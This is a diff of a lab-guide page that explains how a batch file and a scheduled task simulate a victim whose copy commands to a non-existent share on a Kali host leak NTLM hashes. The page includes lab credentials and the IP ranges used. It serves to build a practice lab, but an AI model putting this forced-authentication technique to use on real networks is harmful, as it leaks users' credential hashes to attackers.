@@ -20,12 +20,12 @@ copy \\%BaseRange%.%%A\laptop_data c:\users\pukcab\documents\old_data >nul 2>&1 
 )
 ```
 
-SET BaseRange is the ip-range where our kali machine is located.\
-Set Min and Max, is the specific host within this ip-range. Our kali machine is located within the ip-range `192.168.248.1` through `192.168.248.25`
+`SET BaseRange` is the IP-range where our kali machine is located.\
+Set Min and Max, is the specific host within this ip-range. Our kali machine is located within the IP-range `192.168.248.1` through `192.168.248.25`
 
-The for loop is going to loop through the ip-range and tries to 'copy' a file from a non-existing share. This will result in leaking the NTLM-hash.
+The for loop is going to loop through the IP-range and tries to 'copy' a file from a non-existing share. This will result in leaking the NTLM-hash.
 
-We need to save this file to a location accessible for the user who's going to run the bat-file. In our example the user who's going to run the scheduled task is pukcab. We have put the file inside the documents folder.
+We need to save this file to a location accessible for the user who's going to run the bat-file. In our example the user who's going to run the scheduled task is `pukcab`. We have put the file inside the documents folder.
 
 {% hint style="info" %}
 The range in our ESXI lab for our kali machines is different because we get access by VPN. For recreating the lab the following settings should be used:
@@ -39,15 +39,15 @@ SET Max=150
 
 #### Creating a scheduled task
 
-1\. Open up 'Task Scheduler'
+1\. Open up 'Task Scheduler'.
 
 ![](<../../.gitbook/assets/afbeelding (29).png>)
 
-2\. Select 'Task Scheduler Library' and create a new task
+2\. Select "Task Scheduler Library" and click "create a new task".
 
 ![](<../../.gitbook/assets/afbeelding (26).png>)
 
-3\. In the 'General' tab, select "Run whetever user is logged on or not". Also we need to change the user, this can be done by clicking on "Change User..." and login with the user we have created for this attack, in our case `pukcab:Bangbang123`&#x20;
+3\. In the "General" tab, select "Run whetever user is logged on or not". Also we need to change the user, this can be done by clicking on "Change User..." and login with the user we have created for this attack, in our case `pukcab:Bangbang123` .
 
 ![](<../../.gitbook/assets/afbeelding (9).png>)
 
@@ -55,11 +55,11 @@ SET Max=150
 
 ![](<../../.gitbook/assets/afbeelding (4).png>)
 
-5\. In the 'Actions' tab click on 'New...' and browse to your .bat file and click on 'OK'. You should have about the same as us:
+5\. In the "Actions" tab click on "New..." and browse to your .bat file and click on "OK". You should have about the same as us:
 
 ![](<../../.gitbook/assets/afbeelding (6).png>)
 
-6\. Conditions doesn't need any change, so we can go to the last tab called 'Settings'. Within 'Settings' the only thing we need to change is 'Do not start a new instance' to "Run a new instance in parralel".
+6\. Conditions doesn't need any change, so we can go to the last tab called "Settings". Within "Settings" the only thing we need to change is "Do not start a new instance" to "Run a new instance in parallel".
 
 ![](../../.gitbook/assets/afbeelding.png)
 
